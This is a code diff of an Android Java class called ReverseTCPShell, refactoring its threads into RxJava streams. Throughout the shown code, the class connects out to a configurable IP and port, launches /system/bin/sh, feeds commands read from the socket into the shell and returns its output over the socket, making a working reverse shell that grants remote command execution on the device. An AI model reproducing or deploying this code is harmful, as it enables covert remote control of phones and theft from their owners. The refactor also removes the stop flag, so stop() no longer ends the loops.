@@ -5,6 +5,10 @@ import android.os.HandlerThread;
 import android.os.Message;
 import android.util.Log;
 
+import org.reactivestreams.Publisher;
+import org.reactivestreams.Subscriber;
+import org.reactivestreams.Subscription;
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
@@ -12,6 +16,18 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.util.concurrent.Executor;
+
+import io.reactivex.BackpressureStrategy;
+import io.reactivex.Flowable;
+import io.reactivex.FlowableEmitter;
+import io.reactivex.FlowableOnSubscribe;
+import io.reactivex.android.schedulers.AndroidSchedulers;
+import io.reactivex.functions.Consumer;
+import io.reactivex.internal.functions.Functions;
+import io.reactivex.schedulers.Schedulers;
+import io.reactivex.subscribers.DefaultSubscriber;
+import io.reactivex.subscribers.ResourceSubscriber;
 
 /**
  * Created by LongYH on 2017/6/7.
@@ -48,7 +64,6 @@ public class ReverseTCPShell {
     private static final int FEEDBACK = 3;
     private static final int STOP = 4;
 
-    private boolean alive = true;
     private String ip;
     private int port;
     private Socket socket;
@@ -57,12 +72,11 @@ public class ReverseTCPShell {
     private ConnectErrorListener errorListener;
     private ConnectListener connectListener;
 
-    private Handler handler;
-    private HandlerThread feedBackThread;//反馈本地内容线程
-    private HandlerThread receiveThread;//读取tcp命令线程
-
     private PrintWriter commandWriter;
     private BufferedReader commandReader;
+
+    private TypicalSubscriber feedBackSubscriber;
+    private TypicalSubscriber receiveSubscriber;
 
     private ReverseTCPShell() {
         super();
@@ -78,118 +92,122 @@ public class ReverseTCPShell {
         final ReverseTCPShell tcpShell = new ReverseTCPShell(ip, port);
         tcpShell.errorListener = errorListener;
         tcpShell.connectListener = connectListener;
-        tcpShell.handler = new Handler() {
-            @Override
-            public void handleMessage(Message msg) {
-                switch (msg.what) {
-                    case ERROR:
-                        tcpShell.errorListener.error(msg.obj.toString());
-                        break;
-                    case CONNECTED:
-                        //开启监听
-                        tcpShell.startFeedBackThread();
-                        tcpShell.startReceiveThread();
-                        tcpShell.connectListener.connected(tcpShell);
-                        break;
-                    case RECEIVE:
-                        tcpShell.connectListener.receiveMessage(msg.obj.toString());
-                        break;
-                    case FEEDBACK:
-                        tcpShell.connectListener.feedbackMessage(msg.obj.toString());
-                        break;
-                    case STOP:
-                        tcpShell.connectListener.stopped();
-                        break;
-                }
-            }
-        };
         tcpShell.connect();
     }
 
 
     private void connect() {
-        new Thread() {
+        Flowable.create(new FlowableOnSubscribe<Object>() {
             @Override
-            public void run() {
+            public void subscribe(FlowableEmitter<Object> e) throws Exception {
                 Log.d(TAG, "尝试连接服务器:" + ip + ":" + port);
-                try {
-                    socket = new Socket(ip, port);
-                    socketWriter = new PrintWriter(socket.getOutputStream(), true);
-                    socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-                    socketWriter.println("---Connection has been established---");
-                    socketWriter.flush();
-                    Log.d(TAG, "与服务器连接成功");
-                    Message msg = Message.obtain();
-                    msg.what = CONNECTED;
-                    handler.sendMessage(msg);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                    Message msg = Message.obtain();
-                    msg.what = ERROR;
-                    msg.obj = e.getMessage();
-                    handler.sendMessage(msg);
-                }
+                socket = new Socket(ip, port);
+                socketWriter = new PrintWriter(socket.getOutputStream(), true);
+                socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                socketWriter.println("---Connection has been established---");
+                socketWriter.flush();
+                Log.d(TAG, "与服务器连接成功");
+                e.onNext("");
             }
-        }.start();
+        }, BackpressureStrategy.BUFFER)
+                .subscribeOn(Schedulers.newThread())
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribe(new ResourceSubscriber<Object>() {
+                    @Override
+                    public void onNext(Object o) {
+                        //开启监听
+                        startFeedBackThread();
+                        startReceiveThread();
+                        connectListener.connected(ReverseTCPShell.this);
+                    }
+
+                    @Override
+                    public void onError(Throwable t) {
+                        errorListener.error(t.getMessage());
+                    }
+
+                    @Override
+                    public void onComplete() {
+
+                    }
+                });
     }
 
     private void startFeedBackThread() {
-        feedBackThread = new HandlerThread("feedback") {
+        feedBackSubscriber = new TypicalSubscriber<String>() {
             @Override
-            public void run() {
-                try {
-                    Runtime rt = Runtime.getRuntime();
-                    Process p = rt.exec("/system/bin/sh");
+            public void onNext(String s) {
+                connectListener.feedbackMessage(s);
+            }
 
-                    InputStream IS = p.getInputStream();
-                    OutputStream OS = p.getOutputStream();
-                    commandWriter = new PrintWriter(OS);
-                    commandReader = new BufferedReader(new InputStreamReader(IS));
+            @Override
+            public void onError(Throwable t) {
+                connectStopped();
+            }
 
-                    String line = "";
-                    while ((line = commandReader.readLine()) != null && alive) {
-                        socketWriter.println(line);
-                        socketWriter.flush();
-                        Message msg = Message.obtain();
-                        msg.what = FEEDBACK;
-                        msg.obj = line;
-                        handler.sendMessage(msg);
-                    }
-                    p.destroy();
-                } catch (Exception e) {
-                    e.printStackTrace();
-                } finally {
-                    connectStopped();
-                }
+            @Override
+            public void onComplete() {
+                connectStopped();
             }
         };
-        feedBackThread.start();
+        Flowable.create(new FlowableOnSubscribe<String>() {
+            @Override
+            public void subscribe(FlowableEmitter<String> e) throws Exception {
+                Runtime rt = Runtime.getRuntime();
+                Process p = rt.exec("/system/bin/sh");
+
+                InputStream IS = p.getInputStream();
+                OutputStream OS = p.getOutputStream();
+                commandWriter = new PrintWriter(OS);
+                commandReader = new BufferedReader(new InputStreamReader(IS));
+
+                String line = "";
+                while ((line = commandReader.readLine()) != null) {
+                    socketWriter.println(line);
+                    socketWriter.flush();
+                    e.onNext(line);
+                }
+                p.destroy();
+                e.onComplete();
+            }
+        }, BackpressureStrategy.BUFFER)
+                .subscribeOn(Schedulers.newThread())
+                .observeOn(AndroidSchedulers.mainThread()).subscribe(feedBackSubscriber);
     }
 
     public void startReceiveThread() {
-        receiveThread = new HandlerThread("receive") {
+        receiveSubscriber = new TypicalSubscriber<String>() {
             @Override
-            public void run() {
-                String receive;
-                try {
-                    while ((receive = socketReader.readLine()) != null && alive) {
-                        if (commandWriter != null) {
-                            commandWriter.println(receive);
-                            commandWriter.flush();
-                            Message msg = Message.obtain();
-                            msg.what = RECEIVE;
-                            msg.obj = receive;
-                            handler.sendMessage(msg);
-                        }
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                } finally {
-                    connectStopped();
-                }
+            public void onNext(String s) {
+                connectListener.receiveMessage(s);
+            }
+
+            @Override
+            public void onError(Throwable t) {
+                connectStopped();
+            }
+
+            @Override
+            public void onComplete() {
+                connectStopped();
             }
         };
-        receiveThread.start();
+        Flowable.create(new FlowableOnSubscribe<String>() {
+            @Override
+            public void subscribe(FlowableEmitter<String> e) throws Exception {
+                String receive;
+                while ((receive = socketReader.readLine()) != null) {
+                    if (commandWriter != null) {
+                        commandWriter.println(receive);
+                        commandWriter.flush();
+                        e.onNext(receive);
+                    }
+                }
+                e.onComplete();
+            }
+        }, BackpressureStrategy.BUFFER)
+                .subscribeOn(Schedulers.newThread())
+                .observeOn(AndroidSchedulers.mainThread()).subscribe(receiveSubscriber);
     }
 
 
@@ -199,22 +217,12 @@ public class ReverseTCPShell {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        Message msg = Message.obtain();
-        msg.what = STOP;
-        handler.sendMessage(msg);
+        connectListener.stopped();
     }
 
 
     synchronized public void stop() {
         connectStopped();
-        handler.removeMessages(RECEIVE);
-        handler.removeMessages(FEEDBACK);
-        handler.removeMessages(ERROR);
-        handler.removeMessages(CONNECTED);
-        this.alive = false;
-        feedBackThread.quit();
-        receiveThread.quit();
-
     }
 
 }
